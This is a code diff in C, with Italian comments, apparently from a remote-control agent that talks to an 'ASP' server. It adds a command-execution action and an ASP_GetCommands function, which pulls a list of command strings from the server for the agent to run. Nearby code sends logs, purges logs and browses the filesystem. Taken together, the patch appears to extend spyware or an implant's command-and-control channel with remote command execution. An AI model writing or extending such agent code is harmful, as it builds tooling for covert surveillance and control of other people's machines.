@@ -54,6 +54,7 @@ ASPThreadDataStruct ASPThreadData;
 #define ASP_BYE   10  // Chiude la sessione
 #define ASP_SSTAT 11  // Invia info sui log che sta per spedire
 #define ASP_PURGE 12  // Riceve i dati per il purge dei log
+#define ASP_CMDE  13  // Prende le richieste di command execution
 
 // XXXXX da definire....
 #define MAX_ASP_IN_PARAM 1024
@@ -1187,6 +1188,10 @@ void __stdcall  ASP_MainLoop(char *asp_server)
 			ret_success = H_ASP_GenericCommand(PROTO_FILESYSTEM, &ASP_IPC_command->out_command, &message, &msg_len);
 			ASP_REPORT_MESSAGE_BACK;
 
+		} else if (ASP_IPC_command->action == ASP_CMDE) {
+			ret_success = H_ASP_GenericCommand(PROTO_COMMANDS, &ASP_IPC_command->out_command, &message, &msg_len);
+			ASP_REPORT_MESSAGE_BACK;
+
 		} else if (ASP_IPC_command->action == ASP_SSTAT) {
 			ret_success = H_ASP_GenericCommandPL(PROTO_LOGSTATUS, ASP_IPC_command->in_param, sizeof(asp_request_stat), &ASP_IPC_command->out_command, &message, &msg_len);
 			SAFE_FREE(message);
@@ -1656,6 +1661,54 @@ BOOL ASP_GetFileSystem(DWORD *num_elem, fs_browse_elem **fs_array)
 		ptr += sizeof(DWORD);
 		// start dir (stringa pascalizzata)
 		if (!((*fs_array)[i].start_dir = UnPascalizeString(ptr, &ret_len)))
+			break;
+
+		(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
+		ptr += (ret_len + sizeof(DWORD));
+	}
+
+	return TRUE;
+}
+
+// Prende la lista delle richieste di esecuzione comandi
+// Se torna TRUE ha allocato cmd_array (che va liberato) di num_elem elementi
+BOOL ASP_GetCommands(DWORD *num_elem, WCHAR ***cmd_array)
+{
+	BYTE *ptr;
+	DWORD i, ret_len, elem_count;
+	
+	*num_elem = 0;
+
+	// Controlla che il processo host ASP sia ancora aperto e che non stia
+	// gia' eseguendo delle operazioni
+	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
+		return FALSE;
+
+	ASP_IPC_command->action = ASP_CMDE;
+	ASP_IPC_command->status = ASP_FETCH;
+
+	if (!ASP_Wait_Response())
+		return FALSE;
+
+	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len == 0)
+		return FALSE;
+
+	// Numero di download richiesti
+	ptr = ASP_IPC_command->out_param;
+	elem_count = *((DWORD *)ptr);
+	ptr += sizeof(DWORD);
+	if (elem_count == 0)
+		return FALSE;
+
+	// Alloca l'array di elementi fs
+	*cmd_array = (WCHAR **)calloc(elem_count, sizeof(WCHAR *));
+	if (!(*cmd_array))
+		return FALSE;
+
+	// Valorizza gli elementi dell'array
+	for (i=0; i<elem_count; i++) {
+		// i comandi sono una serie di stringhe pascalizzate
+		if (!((*cmd_array)[i] = UnPascalizeString(ptr, &ret_len)))
 			break;
 
 		(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
